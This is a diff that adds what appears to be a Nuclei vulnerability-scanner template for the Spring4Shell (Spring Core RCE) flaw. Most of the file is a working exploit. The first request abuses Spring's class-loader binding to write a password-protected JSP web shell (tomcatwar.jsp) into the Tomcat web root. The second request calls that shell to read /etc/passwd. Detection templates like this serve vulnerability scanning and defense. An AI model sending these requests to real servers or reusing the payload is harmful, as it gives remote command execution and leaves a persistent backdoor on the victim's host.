@@ -1,0 +1,43 @@
+id: spring-core-rce
+
+info:
+  name: Spring Core RCE 0-day
+  author: DhiyaneshDK
+  severity: critical
+  tags: springboot,rce
+  reference:
+    - https://twitter.com/sillyferns/status/1509255404500529153
+    - https://securityboulevard.com/2022/03/new-spring4shell-zero-day-vulnerability-confirmed-what-it-is-and-how-to-be-prepared/
+    - https://www.cyberkendra.com/2022/03/rce-0-day-exploit-found-in-spring-cloud.html
+
+requests:
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        DNT: 1
+        Suffix: %>//
+        c1: Runtime
+        c2: <%
+        Accept-Encoding: gzip
+
+        class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
+
+      - |
+        GET /tomcatwar.jsp?pwd=j&cmd=cat+/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36
+        Accept-Encoding: gzip
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        part: body
+
+      - type: word
+        words:
+          - "Content-Type: text/html"
+        part: header
